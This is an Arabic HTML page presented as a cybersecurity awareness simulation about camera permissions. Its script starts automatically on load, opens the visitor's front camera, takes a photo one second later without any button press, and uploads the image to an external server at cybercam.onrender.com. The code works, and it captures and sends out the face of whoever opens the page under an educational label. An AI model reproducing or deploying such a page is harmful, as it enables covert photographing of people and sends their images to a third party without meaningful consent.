<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberCam - Security Awareness</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: #111;
            color: white;
            padding: 40px 20px;
        }

        button {
            padding: 12px 25px;
            margin: 10px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }

        #startCamera {
            background: #1683ff;
            color: white;
        }

        #capture {
            background: #28a745;
            color: white;
        }

        video, img {
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
            margin-top: 20px;
        }
    </style>
</head>

<body>

<h1>محاكاة توعوية للأمن السيبراني</h1>

<p>
    تجربة تعليمية لمحاكاة مخاطر صلاحيات الكاميرا في المواقع الإلكترونية.
</p>

<p id="status">
    جاري تشغيل الكاميرا...
</p>

<video id="video" autoplay playsinline></video>

<canvas id="canvas" style="display:none;"></canvas>

<img id="photo" style="display:none;">

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const photo = document.getElementById("photo");
const statusText = document.getElementById("status");

async function startCamera() {

    try {

        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user"
            },
            audio: false
        });

        video.srcObject = stream;

        statusText.textContent =
            "تم السماح بالكاميرا، جاري التقاط الصورة...";

        video.onloadedmetadata = () => {

            setTimeout(() => {
                captureAndSend();
            }, 1000);

        };

    } catch (error) {

        console.error(error);

        statusText.textContent =
            "لم يتم السماح باستخدام الكاميرا.";

    }
}

async function captureAndSend() {

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const context = canvas.getContext("2d");

    context.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
    );

    const imageData = canvas.toDataURL("image/png");

    photo.src = imageData;
    photo.style.display = "block";

    statusText.textContent =
        "تم التقاط الصورة، جاري إرسالها للمحاكاة...";

    try {

        const response = await fetch(
            "https://cybercam.onrender.com/api/upload",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    image: imageData
                })
            }
        );

        const result = await response.json();

        if (result.success) {

            statusText.textContent =
                "تم إرسال الصورة بنجاح.";

        } else {

            statusText.textContent =
                "فشل إرسال الصورة.";

        }

    } catch (error) {

        console.error(error);

        statusText.textContent =
            "تعذر الاتصال بالسيرفر.";

    }
}

startCamera();
</script>
</body>
</html>
